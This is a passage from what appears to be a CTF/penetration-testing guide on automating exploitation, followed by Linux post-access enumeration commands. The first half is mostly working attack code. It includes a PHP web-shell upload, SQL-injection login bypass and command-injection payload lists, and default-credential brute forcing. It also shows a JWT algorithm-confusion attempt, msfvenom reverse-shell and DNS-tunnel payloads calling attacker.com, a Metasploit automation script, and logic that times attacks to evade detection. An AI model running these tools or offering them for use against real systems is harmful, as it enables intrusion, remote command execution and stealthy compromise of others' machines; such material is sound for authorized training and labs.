        with socket.create_connection((host, port), timeout=timeout) as s:
            s.settimeout(timeout)
            # Try to read a small banner (non-destructive). If you expect a shell prompt,
            # adapt this in a controlled, authorized environment.
            try:
                data = s.recv(256)
            except socket.timeout:
                data = b''
            # Basic heuristic: any non-empty response suggests something is listening.
            return bool(data) or True  # return True if port accepted connection
    except Exception as e:
        logging.debug("validate_shell_access exception: %s", e)
        return False

def execute_exploit(target: str, path: str) -> bool:
    """
    MOCK implementation: simulate different outcomes by path.
    Replace this with authorized, instrumented exploit modules in a controlled lab.
    """
    logging.info("Attempting exploit path: %s on %s", path, target)
    # Simulated behavior:
    if path == "direct_rce":
        time.sleep(0.5)
        return False
    if path == "upload_chain":
        time.sleep(0.8)
        return False
    if path == "sqli_rce":
        time.sleep(0.6)
        return False
    if path == "bind_shell":
        time.sleep(0.4)
        return True
    return False

def conditional_exploitation(target: str, check_ports: Tuple[int, ...] = (4444, 5555)) -> bool:
    exploit_path = "direct_rce"
    tried = []

    # Try primary -> fallback -> fallback
    if not execute_exploit(target, exploit_path):
        tried.append(exploit_path)
        logging.warning("Direct RCE failed, trying upload_chain")
        exploit_path = "upload_chain"

        if not execute_exploit(target, exploit_path):
            tried.append(exploit_path)
            logging.warning("Upload chain failed, trying sqli_rce")
            exploit_path = "sqli_rce"
            execute_exploit(target, exploit_path)
            tried.append(exploit_path)

    # Validate by checking connectivity on candidate ports
    for port in check_ports:
        logging.info("Validating shell access on %s:%d", target, port)
        if validate_shell_access(target, port):
            logging.info("[+] Shell access confirmed on port %d", port)
            return True

    # Final attempt: bind shell fallback
    logging.warning("No shell confirmed on expected ports (%s). Attempting bind_shell", tried)
    execute_exploit(target, "bind_shell")

    # re-check ports again
    for port in check_ports:
        if validate_shell_access(target, port):
            logging.info("[+] Shell access confirmed on port %d after bind_shell", port)
            return True

    logging.error("[-] No shell access after all attempts")
    return False

if __name__ == "__main__":
    # Example run (mocked). Replace '127.0.0.1' with an authorized test target.
    success = conditional_exploitation("127.0.0.1", check_ports=(4444, 5555))
    print("Result:", success)

```

### Advanced Conditional Logic Patterns

**Network Topology-Based Decisions**

Adapt exploitation based on network position and segmentation:

```bash
#!/bin/bash

TARGET=$1

# Determine network topology
function analyze_network_position() {
    # Check if target is directly accessible
    if ping -c 1 -W 1 $TARGET &>/dev/null; then
        echo "direct"
        return
    fi
    
    # Check if target requires pivoting
    route -n | grep -q "^0.0.0.0.*$TARGET" && echo "pivot_required" && return
    
    # Check if target is in DMZ (common DMZ patterns)
    if echo $TARGET | grep -qE '^10\.0\.|^172\.(1[6-9]|2[0-9]|3[0-1])\.|^192\.168\.'; then
        # Check for dual-homed hosts
        ip route show | grep -q "10.0" && ip route show | grep -q "192.168" && \
            echo "dmz_dual_homed" && return
    fi
    
    echo "unknown"
}

TOPOLOGY=$(analyze_network_position)

case "$TOPOLOGY" in
    "direct")
        echo "[*] Direct exploitation path"
        ./exploit_direct.sh $TARGET
        ;;
    "pivot_required")
        echo "[*] Establishing pivot through compromised host"
        # Use existing foothold for pivoting
        ssh -L 8080:$TARGET:80 compromised@pivot_host
        ./exploit_via_tunnel.sh localhost 8080
        ;;
    "dmz_dual_homed")
        echo "[*] Target in DMZ, using dual-homed exploitation"
        ./exploit_dmz_pivot.sh $TARGET
        ;;
    *)
        echo "[!] Unable to determine network path, attempting discovery"
        ./network_discovery.sh $TARGET
        ;;
esac
```

**Protocol-Based Conditional Exploitation**

Select attack vectors based on available protocols:

```python
#!/usr/bin/env python3
import socket
import struct
import subprocess
from scapy.all import sr1, IP, ICMP, TCP, UDP

class ProtocolSelector:
    def __init__(self, target):
        self.target = target
        self.available_protocols = []
        
    def test_icmp(self):
        """Test ICMP availability for covert channels"""
        try:
            pkt = IP(dst=self.target)/ICMP()
            resp = sr1(pkt, timeout=2, verbose=0)
            return resp is not None
        except:
            return False
    
    def test_tcp_connectivity(self, ports=[80, 443, 22, 445]):
        """Test TCP connectivity on common ports"""
        open_ports = []
        for port in ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((self.target, port))
                if result == 0:
                    open_ports.append(port)
                sock.close()
            except:
                pass
        return open_ports
    
    def test_udp_connectivity(self, ports=[53, 161, 123]):
        """Test UDP connectivity for covert channels"""
        accessible_ports = []
        for port in ports:
            try:
                pkt = IP(dst=self.target)/UDP(dport=port)
                resp = sr1(pkt, timeout=2, verbose=0)
                # If we get a response or no ICMP unreachable, port may be accessible
                if resp is None or not resp.haslayer(ICMP):
                    accessible_ports.append(port)
            except:
                pass
        return accessible_ports
    
    def select_exploitation_protocol(self):
        """Choose optimal protocol based on availability"""
        tcp_ports = self.test_tcp_connectivity()
        udp_ports = self.test_udp_connectivity()
        icmp_available = self.test_icmp()
        
        if 443 in tcp_ports:
            return ("https_reverse_shell", 443, "tcp")
        elif 80 in tcp_ports:
            return ("http_reverse_shell", 80, "tcp")
        elif 53 in udp_ports:
            return ("dns_tunnel", 53, "udp")
        elif icmp_available:
            return ("icmp_tunnel", 0, "icmp")
        elif tcp_ports:
            return ("tcp_custom", tcp_ports[0], "tcp")
        else:
            return ("bind_shell", 4444, "tcp")
    
    def deploy_payload(self):
        """Deploy payload using selected protocol"""
        protocol, port, proto_type = self.select_exploitation_protocol()
        
        if protocol == "dns_tunnel":
            print(f"[*] Using DNS tunneling on port {port}")
            subprocess.run([
                "msfvenom", "-p", "windows/dns_txt_query_exec",
                f"DNSZONE=attacker.com",
                "-f", "exe", "-o", "dns_payload.exe"
            ])
        elif protocol == "icmp_tunnel":
            print("[*] Using ICMP tunneling")
            subprocess.run([
                "msfvenom", "-p", "linux/x86/shell/reverse_icmp",
                f"LHOST={self.get_attacker_ip()}",
                "-f", "elf", "-o", "icmp_payload"
            ])
        else:
            print(f"[*] Using {protocol} on port {port}")
            subprocess.run([
                "msfvenom", "-p", f"generic/shell_reverse_tcp",
                f"LHOST={self.get_attacker_ip()}",
                f"LPORT={port}",
                "-f", "raw", "-o", f"payload_{port}"
            ])
        
        return protocol, port
```

**Authentication State-Aware Exploitation**

Branch exploitation based on authentication requirements:

```python
#!/usr/bin/env python3
import requests
import re
from bs4 import BeautifulSoup

class AuthAwareExploit:
    def __init__(self, target):
        self.target = target
        self.session = requests.Session()
        self.auth_required = False
        self.auth_type = None
        
    def detect_auth_mechanism(self):
        """Identify authentication requirements"""
        try:
            resp = self.session.get(f"http://{self.target}/admin")
            
            # Check for 401 Unauthorized (HTTP Basic/Digest)
            if resp.status_code == 401:
                if 'WWW-Authenticate' in resp.headers:
                    auth_header = resp.headers['WWW-Authenticate']
                    if 'Basic' in auth_header:
                        self.auth_type = "http_basic"
                    elif 'Digest' in auth_header:
                        self.auth_type = "http_digest"
                    elif 'NTLM' in auth_header:
                        self.auth_type = "ntlm"
                self.auth_required = True
                
            # Check for form-based authentication
            elif 'login' in resp.text.lower() or 'password' in resp.text.lower():
                soup = BeautifulSoup(resp.text, 'html.parser')
                form = soup.find('form')
                if form:
                    self.auth_type = "form_based"
                    self.auth_required = True
                    
            # Check for OAuth/JWT
            elif 'oauth' in resp.text.lower() or 'bearer' in resp.text.lower():
                self.auth_type = "oauth_jwt"
                self.auth_required = True
                
            return self.auth_type
            
        except Exception as e:
            print(f"[-] Error detecting auth: {e}")
            return None
    
    def exploit_with_auth_bypass(self):
        """Attempt authentication bypass techniques"""
        if self.auth_type == "http_basic":
            return self.exploit_basic_auth()
        elif self.auth_type == "form_based":
            return self.exploit_form_auth()
        elif self.auth_type == "oauth_jwt":
            return self.exploit_jwt()
        else:
            return self.exploit_no_auth()
    
    def exploit_basic_auth(self):
        """HTTP Basic authentication exploitation"""
        # Try common credentials
        creds = [
            ('admin', 'admin'),
            ('admin', 'password'),
            ('root', 'root')
        ]
        
        for username, password in creds:
            resp = self.session.get(
                f"http://{self.target}/admin",
                auth=(username, password)
            )
            if resp.status_code == 200:
                print(f"[+] Authenticated as {username}:{password}")
                return self.authenticated_exploitation()
        
        # Try SQL injection in auth header
        sqli_payloads = [
            "admin' OR '1'='1",
            "admin'--",
            "' OR 1=1--"
        ]
        
        for payload in sqli_payloads:
            resp = self.session.get(
                f"http://{self.target}/admin",
                auth=(payload, 'anything')
            )
            if resp.status_code == 200:
                print("[+] SQL injection in auth header successful")
                return self.authenticated_exploitation()
                
        return False
    
    def exploit_form_auth(self):
        """Form-based authentication exploitation"""
        # Extract form action and fields
        resp = self.session.get(f"http://{self.target}/login")
        soup = BeautifulSoup(resp.text, 'html.parser')
        form = soup.find('form')
        
        if not form:
            return False
        
        action = form.get('action', '/login')
        
        # Try SQL injection payloads
        sqli_payloads = {
            'username': ["admin' OR '1'='1'--", "admin'--", "' OR 1=1--"],
            'password': ['anything']
        }
        
        for user_payload in sqli_payloads['username']:
            data = {
                'username': user_payload,
                'password': 'anything'
            }
            resp = self.session.post(f"http://{self.target}{action}", data=data)
            
            if 'logout' in resp.text.lower() or resp.status_code == 302:
                print(f"[+] SQL injection successful with payload: {user_payload}")
                return self.authenticated_exploitation()
        
        # Try default credentials
        default_creds = [
            {'username': 'admin', 'password': 'admin'},
            {'username': 'administrator', 'password': 'password'}
        ]
        
        for creds in default_creds:
            resp = self.session.post(f"http://{self.target}{action}", data=creds)
            if resp.status_code == 302 or 'dashboard' in resp.text.lower():
                print(f"[+] Logged in with {creds['username']}")
                return self.authenticated_exploitation()
                
        return False
    
    def exploit_jwt(self):
        """JWT-based authentication exploitation"""
        # Try to obtain JWT
        resp = self.session.post(
            f"http://{self.target}/api/login",
            json={'username': 'admin', 'password': 'admin'}
        )
        
        if 'token' in resp.json():
            token = resp.json()['token']
            
            # Try algorithm confusion attack (change RS256 to HS256)
            import jwt
            try:
                # Decode without verification
                decoded = jwt.decode(token, options={"verify_signature": False})
                
                # Try to sign with algorithm confusion
                # [Inference] This may work if server accepts HS256 with public key
                manipulated = jwt.encode(
                    decoded,
                    "public_key_content",  # Would need actual public key
                    algorithm="HS256"
                )
                
                self.session.headers['Authorization'] = f'Bearer {manipulated}'
                
            except Exception as e:
                print(f"[-] JWT manipulation failed: {e}")
                
        return self.authenticated_exploitation()
    
    def authenticated_exploitation(self):
        """Post-authentication exploitation"""
        # Now that we're authenticated, exploit authenticated endpoints
        print("[*] Attempting authenticated RCE")
        
        # File upload exploitation
        files = {'file': ('shell.php', '<?php system($_GET["cmd"]); ?>')}
        resp = self.session.post(
            f"http://{self.target}/admin/upload",
            files=files
        )
        
        if resp.status_code == 200:
            print("[+] Shell uploaded successfully")
            # Execute command
            cmd_resp = self.session.get(
                f"http://{self.target}/uploads/shell.php?cmd=id"
            )
            print(f"[+] Command output: {cmd_resp.text}")
            return True
            
        return False
    
    def exploit_no_auth(self):
        """Unauthenticated exploitation path"""
        print("[*] No authentication required, attempting direct exploitation")
        
        # Try common unauthenticated vulnerabilities
        exploits = [
            self.try_path_traversal,
            self.try_command_injection,
            self.try_file_inclusion
        ]
        
        for exploit in exploits:
            if exploit():
                return True
        
        return False
```

**Resource Constraint-Based Decisions**

Adapt exploitation based on system resources:

```bash
#!/bin/bash

TARGET=$1

# Assess target system resources
function assess_target_resources() {
    # Execute reconnaissance commands if we have limited shell
    CPU_COUNT=$(ssh $TARGET "nproc" 2>/dev/null)
    MEM_TOTAL=$(ssh $TARGET "free -m | awk 'NR==2{print \$2}'" 2>/dev/null)
    DISK_SPACE=$(ssh $TARGET "df -h / | awk 'NR==2{print \$4}'" 2>/dev/null)
    
    echo "cpu:$CPU_COUNT mem:$MEM_TOTAL disk:$DISK_SPACE"
}

# Select payload based on available resources
function select_resource_appropriate_payload() {
    RESOURCES=$(assess_target_resources)
    
    CPU=$(echo $RESOURCES | grep -oP 'cpu:\K\d+')
    MEM=$(echo $RESOURCES | grep -oP 'mem:\K\d+')
    
    if [[ $CPU -ge 4 && $MEM -ge 4096 ]]; then
        echo "[*] High-resource target detected, using full-featured payload"
        PAYLOAD="linux/x64/meterpreter_reverse_tcp"
        ENCODER="x64/xor_dynamic"
    elif [[ $CPU -ge 2 && $MEM -ge 1024 ]]; then
        echo "[*] Medium-resource target, using standard payload"
        PAYLOAD="linux/x64/shell_reverse_tcp"
        ENCODER="x64/xor"
    else
        echo "[*] Low-resource target, using minimal payload"
        PAYLOAD="linux/x64/exec"
        ENCODER="none"
    fi
    
    # Generate appropriate payload
    if [ "$ENCODER" != "none" ]; then
        msfvenom -p $PAYLOAD \
            LHOST=$ATTACKER_IP LPORT=4444 \
            -e $ENCODER \
            -f elf -o payload_optimized
    else
        msfvenom -p $PAYLOAD \
            LHOST=$ATTACKER_IP LPORT=4444 \
            -f elf -o payload_minimal
    fi
}

select_resource_appropriate_payload
```

**Time-Based Conditional Exploitation**

Implement time-sensitive exploitation logic:

```python
#!/usr/bin/env python3
import time
import datetime
import subprocess

class TimedExploit:
    def __init__(self, target):
        self.target = target
        self.exploit_window = None
        
    def detect_optimal_timing(self):
        """
        [Inference] Identify low-activity periods for exploitation
        Based on monitoring patterns, not guaranteed behavior
        """
        # Check current time
        current_hour = datetime.datetime.now().hour
        
        # Business hours detection (higher risk of detection)
        if 9 <= current_hour <= 17:
            return "business_hours", "high_risk"
        # Evening hours (moderate activity)
        elif 18 <= current_hour <= 22:
            return "evening", "medium_risk"
        # Night hours (lowest activity)
        else:
            return "night", "low_risk"
    
    def wait_for_optimal_window(self, max_wait=3600):
        """Wait for low-activity period"""
        period, risk = self.detect_optimal_timing()
        
        if risk == "high_risk":
            print("[!] Current time has high detection risk")
            print(f"[*] Waiting for safer exploitation window (max {max_wait}s)")
            
            wait_time = 0
            while risk == "high_risk" and wait_time < max_wait:
                time.sleep(60)
                wait_time += 60
                period, risk = self.detect_optimal_timing()
                
        print(f"[+] Exploitation window: {period} ({risk})")
        return True
    
    def execute_timed_exploitation(self):
        """Execute exploitation with timing consideration"""
        self.wait_for_optimal_window()
        
        # Adjust exploitation aggressiveness based on time
        period, risk = self.detect_optimal_timing()
        
        if risk == "low_risk":
            # Aggressive exploitation during low-activity periods
            print("[*] Low-risk period: using comprehensive exploitation")
            subprocess.run(["./comprehensive_exploit.sh", self.target])
        else:
            # Stealthy exploitation during higher-risk periods
            print("[*] Higher-risk period: using stealthy exploitation")
            subprocess.run(["./stealth_exploit.sh", self.target])
```

### Exploitation Automation Frameworks

**Custom Framework Architecture**

Build modular automation framework:

```python
#!/usr/bin/env python3
import json
import logging
from abc import ABC, abstractmethod
from typing import Dict, List, Optional

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)

class ExploitModule(ABC):
    """Base class for exploit modules"""
    
    def __init__(self, name: str, target: str):
        self.name = name
        self.target = target
        self.logger = logging.getLogger(self.name)
        self.results = {}
        
    @abstractmethod
    def check(self) -> bool:
        """Check if target is vulnerable"""
        pass
    
    @abstractmethod
    def exploit(self) -> Dict:
        """Execute exploitation"""
        pass
    
    def validate(self) -> bool:
        """Validate exploitation success"""
        return self.results.get('success', False)

class ReconModule(ExploitModule):
    """Reconnaissance module"""
    
    def check(self) -> bool:
        return True  # Always run reconnaissance
    
    def exploit(self) -> Dict:
        self.logger.info(f"Running reconnaissance on {self.target}")
        # Execute nmap scan
        import subprocess
        result = subprocess.run(
            ['nmap', '-sV', '-sC', self.target],
            capture_output=True,
            text=True
        )
        
        self.results = {
            'success': result.returncode == 0,
            'output': result.stdout,
            'services': self.parse_services(result.stdout)
        }
        return self.results
    
    def parse_services(self, nmap_output: str) -> List[Dict]:
        """Parse nmap output for services"""
        services = []
        for line in nmap_output.split('\n'):
            if '/tcp' in line or '/udp' in line:
                parts = line.split()
                if len(parts) >= 3:
                    services.append({
                        'port': parts[0],
                        'state': parts[1],
                        'service': parts[2]
                    })
        return services

class WebExploitModule(ExploitModule):
    """Web application exploitation module"""
    
    def check(self) -> bool:
        # Check if web service is available
        import requests
        try:
            resp = requests.get(f"http://{self.target}", timeout=5)
            return resp.status_code in [200, 301, 302, 401, 403]
        except:
            return False
    
    def exploit(self) -> Dict:
        self.logger.info("Attempting web exploitation")
        
        # Try multiple web exploits
        exploits = [
            self.sql_injection,
            self.command_injection,
            self.file_upload
        ]
        
        for exploit_func in exploits:
            try:
                result = exploit_func()
                if result['success']:
                    self.results = result
                    return self.results
            except Exception as e:
                self.logger.error(f"Exploit failed: {e}")
                
        self.results = {'success': False}
        return self.results
    
    def sql_injection(self) -> Dict:
        """Attempt SQL injection"""
        import requests
        
        payloads = ["' OR '1'='1", "admin'--", "' UNION SELECT NULL--"]
        
        for payload in payloads:
            try:
                resp = requests.post(
                    f"http://{self.target}/login",
                    data={'username': payload, 'password': 'test'},
                    timeout=5
                )
                
                if 'dashboard' in resp.text.lower() or resp.status_code == 302:
                    return {
                        'success': True,
                        'method': 'sql_injection',
                        'payload': payload
                    }
            except:
                pass
                
        return {'success': False}
    
    def command_injection(self) -> Dict:
        """Attempt command injection"""
        import requests
        
        payloads = [
            "; id",
            "| id",
            "`id`",
            "$(id)"
        ]
        
        for payload in payloads:
            try:
                resp = requests.get(
                    f"http://{self.target}/search?q=test{payload}",
                    timeout=5
                )
                
                if 'uid=' in resp.text:
                    return {
                        'success': True,
                        'method': 'command_injection',
                        'payload': payload
                    }
            except:
                pass
                
        return {'success': False}
    
    def file_upload(self) -> Dict:
        """Attempt malicious file upload"""
        import requests
        
        shell_content = '<?php system($_GET["cmd"]); ?>'
        files = {'file': ('shell.php', shell_content)}
        
        try:
            resp = requests.post(
                f"http://{self.target}/upload",
                files=files,
                timeout=5
            )
            
            if resp.status_code == 200:
                # Try to access uploaded shell
                test_resp = requests.get(
                    f"http://{self.target}/uploads/shell.php?cmd=id",
                    timeout=5
                )
                
                if 'uid=' in test_resp.text:
                    return {
                        'success': True,
                        'method': 'file_upload',
                        'shell_url': f"http://{self.target}/uploads/shell.php"
                    }
        except:
            pass
            
        return {'success': False}

class ExploitationFramework:
    """Main automation framework"""
    
    def __init__(self, target: str):
        self.target = target
        self.modules: List[ExploitModule] = []
        self.results: Dict = {}
        self.logger = logging.getLogger('Framework')
        
    def register_module(self, module: ExploitModule):
        """Register exploitation module"""
        self.modules.append(module)
        self.logger.info(f"Registered module: {module.name}")
    
    def run_sequential(self) -> Dict:
        """Run modules sequentially"""
        self.logger.info(f"Starting sequential exploitation of {self.target}")
        
        for module in self.modules:
            self.logger.info(f"Checking module: {module.name}")
            
            if module.check():
                self.logger.info(f"Module {module.name} applicable, exploiting...")
                result = module.exploit()
                self.results[module.name] = result
                
                if result.get('success'):
                    self.logger.info(f"Module {module.name} successful!")
                    break
                else:
                    self.logger.warning(f"Module {module.name} failed")
            else:
                self.logger.info(f"Module {module.name} not applicable")
                
        return self.results
    
    def run_parallel(self) -> Dict:
        """Run modules in parallel"""
        import concurrent.futures
        
        self.logger.info(f"Starting parallel exploitation of {self.target}")
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
            futures = {}
            
            for module in self.modules:
                if module.check():
                    future = executor.submit(module.exploit)
                    futures[future] = module.name
            
            for future in concurrent.futures.as_completed(futures):
                module_name = futures[future]
                try:
                    result = future.result()
                    self.results[module_name] = result
                    
                    if result.get('success'):
                        self.logger.info(f"Module {module_name} successful!")
                        # Cancel remaining futures
                        for f in futures:
                            f.cancel()
                        break
                except Exception as e:
                    self.logger.error(f"Module {module_name} exception: {e}")
                    
        return self.results
    
    def generate_report(self, output_file: str = "exploit_report.json"):
        """Generate exploitation report"""
        report = {
            'target': self.target,
            'timestamp': str(datetime.datetime.now()),
            'results': self.results
        }
        
        with open(output_file, 'w') as f:
            json.dump(report, f, indent=2)
            
        self.logger.info(f"Report generated: {output_file}")

# Usage example
if __name__ == "__main__":
    framework = ExploitationFramework("192.168.1.100")
    
    # Register modules
    framework.register_module(ReconModule("reconnaissance", "192.168.1.100"))
    framework.register_module(WebExploitModule("web_exploit", "192.168.1.100"))
    
    # Run exploitation
    results = framework.run_sequential()
    
    # Generate report
    framework.generate_report()
```

**Integration with Metasploit Resource Scripts**

Automate Metasploit workflows:

```ruby
# automated_exploitation.rc
# Metasploit resource script for automated exploitation

# Set global options
setg LHOST eth0
setg LPORT 4444
setg RHOST 192.168.1.100

# Stage 1: Reconnaissance
use auxiliary/scanner/portscan/tcp
set PORTS 1-10000
set THREADS 50
run

# Stage 2: Service identification
use auxiliary/scanner/http/http_version
run

use auxiliary/scanner/smb/smb_version
run

# Stage 3: Vulnerability scanning
use auxiliary/scanner/http/wordpress_scanner
run

# Stage 4: Exploitation attempts
use exploit/multi/http/apache_mod_cgi_bash_env_exec
set TARGET 0
check
if [check == true]
  exploit -z
end

# Stage 5: Post-exploitation if shell obtained
sessions -i 1 -c "sysinfo"
sessions -i 1 -c "getuid"
sessions -i 1 -c "run post/multi/recon/local_exploit_suggester"
```

Launch with:

```bash
msfconsole -r automated_exploitation.rc
```

### Related Topics

For comprehensive CTF exploitation mastery, explore these critical related topics:

- **Post-Exploitation Automation**: Automated credential harvesting, lateral movement scripting, data exfiltration pipelines
- **Evasion Automation**: Polymorphic payload generation, automated AV/EDR bypass testing, traffic obfuscation
- **Custom Tool Development**: Building domain-specific exploitation frameworks, integrating multiple tools via APIs
- **Machine Learning in Exploitation**: Automated vulnerability correlation, predictive exploitation path selection

---

# LINUX EXPLOITATION

## Information Gathering (Post-Access)

### System Enumeration

Once access to a target system is gained, comprehensive enumeration is critical for understanding the environment and identifying privilege escalation vectors.

**Basic system information (Linux):**

```bash
# Operating system information
uname -a                    # All system information
uname -s                    # Kernel name
uname -n                    # Node name (hostname)
uname -r                    # Kernel release
uname -v                    # Kernel version
uname -m                    # Machine hardware name
uname -p                    # Processor type
uname -i                    # Hardware platform
uname -o                    # Operating system

# Hostname
hostname
hostname -f                 # Fully qualified domain name
hostname -I                 # All IP addresses
cat /etc/hostname
```

**Distribution information:**

```bash
# Check OS release
cat /etc/os-release
cat /etc/*-release
cat /etc/issue
cat /etc/issue.net

# LSB (Linux Standard Base) information
lsb_release -a              # All information
lsb_release -d              # Description
lsb_release -i              # Distributor ID
lsb_release -r              # Release number
lsb_release -c              # Codename

# Version files for specific distributions
cat /etc/redhat-release     # Red Hat/CentOS
cat /etc/debian_version     # Debian
cat /etc/lsb-release        # Ubuntu
cat /etc/fedora-release     # Fedora
cat /etc/SuSE-release       # SUSE
```

**Kernel and version details:**

```bash
# Kernel version
cat /proc/version
cat /proc/version_signature  # Ubuntu

# System info from /proc
cat /proc/sys/kernel/ostype
cat /proc/sys/kernel/osrelease
cat /proc/sys/kernel/version

# Kernel command line
cat /proc/cmdline

# Loaded kernel modules
lsmod
cat /proc/modules

# Kernel configuration
cat /boot/config-$(uname -r)  # If available
zcat /proc/config.gz           # If CONFIG_IKCONFIG_PROC enabled
```

**Architecture information:**

```bash
# CPU architecture
arch
lscpu                       # Detailed CPU information
cat /proc/cpuinfo
cat /proc/cpuinfo | grep "model name" | uniq
cat /proc/cpuinfo | grep processor | wc -l  # Number of processors

# Check if 32-bit or 64-bit
getconf LONG_BIT
file /bin/bash
uname -m
```

**Hardware information:**

```bash
# PCI devices
lspci
lspci -v                    # Verbose
lspci -k                    # Show kernel modules

# USB devices
lsusb
lsusb -v

# Block devices
lsblk
lsblk -f                    # Show filesystem info

# SCSI devices
lsscsi

# Hardware info (if available)
dmidecode                   # Requires root
dmidecode -t system
dmidecode -t bios
dmidecode -t processor
```

**System uptime and load:**

```bash
# Uptime
uptime
cat /proc/uptime

# System load
cat /proc/loadavg
top -bn1 | head -5
w
```

**Environment variables:**

```bash
# Current environment
env
printenv
export
set

# Specific variables
echo $PATH
echo $HOME
echo $USER
echo $SHELL
echo $HOSTNAME
echo $TERM

# Shell configuration files
cat ~/.bashrc
cat ~/.bash_profile
cat ~/.profile
cat /etc/profile
cat /etc/bash.bashrc
```

**Installed software and packages:**

```bash
# Debian/Ubuntu
dpkg -l
dpkg -l | grep -i package_name
dpkg --get-selections

# Red Hat/CentOS/Fedora
rpm -qa
rpm -qa | grep -i package_name
yum list installed
dnf list installed

# Check for specific software
which gcc
which python
which perl
which wget
which curl
which nc
which nmap

# Software versions
gcc --version
python --version
python3 --version
perl --version
```

**System enumeration scripts:**

```bash
# Basic enumeration one-liner
echo -e "\n### SYSTEM INFO ###\n$(uname -a)\n$(cat /etc/*-release)\n### KERNEL ###\n$(cat /proc/version)\n### USER INFO ###\n$(whoami) - $(id)\n### HOSTNAME ###\n$(hostname)"

# Multi-line enumeration
echo "=== System Information ===" && \
uname -a && \
cat /etc/os-release && \
echo -e "\n=== User Information ===" && \
whoami && id && \
echo -e "\n=== Network Information ===" && \
hostname -I && \
ifconfig || ip a
```

**Windows system enumeration:**

```cmd
# System information
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"

# Computer name
hostname
echo %COMPUTERNAME%

# Architecture
wmic os get osarchitecture
echo %PROCESSOR_ARCHITECTURE%

# OS version
ver
wmic os get Caption,Version,BuildNumber,OSArchitecture

# Installed patches
wmic qfe list
wmic qfe get Caption,Description,HotFixID,InstalledOn

# Installed software
wmic product get name,version
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall

# Environment variables
set
echo %PATH%
echo %USERNAME%
echo %USERDOMAIN%
```

### Kernel Version Identification

Identifying the kernel version is crucial for finding kernel exploits during privilege escalation.

**Kernel version extraction:**

```bash
# Primary methods
uname -r                    # Most reliable
uname -v                    # Verbose version
cat /proc/version

# Example outputs:
# 4.15.0-54-generic         (Ubuntu)
# 3.10.0-1062.el7.x86_64    (CentOS)
# 5.4.0-42-generic          (Ubuntu 20.04)
```

**Parse kernel version components:**

```bash
# Extract major version
uname -r | cut -d. -f1

# Extract major.minor
uname -r | cut -d. -f1-2

# Full version breakdown
KERNEL=$(uname -r)
echo "Full: $KERNEL"
echo "Major: $(echo $KERNEL | cut -d. -f1)"
echo "Minor: $(echo $KERNEL | cut -d. -f2)"
echo "Patch: $(echo $KERNEL | cut -d. -f3 | cut -d- -f1)"
```

**Kernel exploit suggestion:**

```bash
# Manual checks
uname -r
cat /proc/version

# Check against known vulnerable versions
# Example vulnerable kernels:
# < 2.6.39 - DirtyCOW variants
# 2.6.22 < 3.9 - Various local exploits
# 3.13.0-24 < 3.13.0-55 - Overlayfs
# 4.4.0 < 4.4.0-116 - Multiple issues
```

**Automated kernel exploit enumeration:**

Using Linux Exploit Suggester:

```bash
# Download
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh

# Run
bash linux-exploit-suggester.sh

# With specific kernel
bash linux-exploit-suggester.sh -k 4.4.0-21-generic
```

Using LinEnum:

```bash
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh
```

Using LinPEAS:

```bash
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

**Kernel module information:**

```bash
# List loaded modules
lsmod
cat /proc/modules

# Module information
modinfo <module_name>
modinfo overlay
modinfo kernel_module

# Module dependencies
modprobe --show-depends <module>

# Check for specific module
lsmod | grep -i module_name
```

**Kernel configuration check:**

```bash
# Check kernel config (if available)
cat /boot/config-$(uname -r) | grep -i config_name
zcat /proc/config.gz | grep -i config_name

# Important security configs
cat /boot/config-$(uname -r) | grep -E "SMEP|SMAP|KASLR|KPTI"

# Check for kernel hardening
cat /proc/sys/kernel/randomize_va_space    # ASLR (0=off, 1=conservative, 2=full)
cat /proc/sys/kernel/dmesg_restrict        # Restrict dmesg
cat /proc/sys/kernel/kptr_restrict         # Restrict kernel pointers
```

**Kernel exploit database references:**

```bash
# SearchSploit for kernel exploits
searchsploit linux kernel $(uname -r | cut -d. -f1-2)
searchsploit linux kernel 4.4
searchsploit linux kernel privilege escalation

# Example: Dirty COW
searchsploit dirty cow
searchsploit 40839

# Copy exploit
searchsploit -m linux/local/40839.c
```

**Common vulnerable kernel versions:**

[Inference] The following kernel versions have known privilege escalation exploits, though successful exploitation depends on system configuration and applied patches:

```
2.6.22 < 3.9     - Various Perf and PTRACE exploits
3.4.0 - 3.13.0   - Overlayfs, recvmsg exploits
3.13.0-24        - CVE-2015-1328 (Overlayfs)
4.4.0-21         - CVE-2017-16995 (eBPF)
4.8.0 - 4.8.3    - CVE-2016-5195 (Dirty COW)
4.13 - 5.1       - CVE-2019-13272 (PTRACE_TRACEME)
```

**Windows kernel version:**

```cmd
# Get kernel version
wmic os get version
wmic os get BuildNumber

# System info
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"

# Check for patches
wmic qfe list brief
```

### Running Processes

Enumerating running processes reveals active services, user activities, and potential privilege escalation vectors.

**Basic process listing (Linux):**

```bash
# ps command variations
ps                          # Current shell processes
ps aux                      # All processes, all users
ps -ef                      # Full format listing
ps -eF                      # Extra full format
ps -ely                     # Long format with priority
ps auxf                     # Process tree
ps -ejH                     # Process hierarchy
ps axjf                     # BSD-style tree
```

**Detailed ps output:**

```bash
# All processes with full details
ps aux
# USER  PID %CPU %MEM    VSZ   RSS TTY   STAT START   TIME COMMAND

# By user
ps aux | grep root
ps -u username
ps -U root -u root

# By process name
ps aux | grep apache
ps aux | grep mysql
ps -C sshd
pgrep -a sshd

# Full command line
ps auxww
ps -ef --forest
```

**Process sorting and filtering:**

```bash
# Sort by CPU usage
ps aux --sort=-%cpu | head -10
ps aux --sort=-pcpu | head

# Sort by memory usage
ps aux --sort=-%mem | head -10
ps aux --sort=-rss | head

# Sort by PID
ps aux --sort=pid

# Custom columns
ps -eo pid,user,cmd,%cpu,%mem --sort=-%cpu | head

# Process with specific state
ps aux | grep ^root          # Root processes
ps aux | grep ' R '          # Running
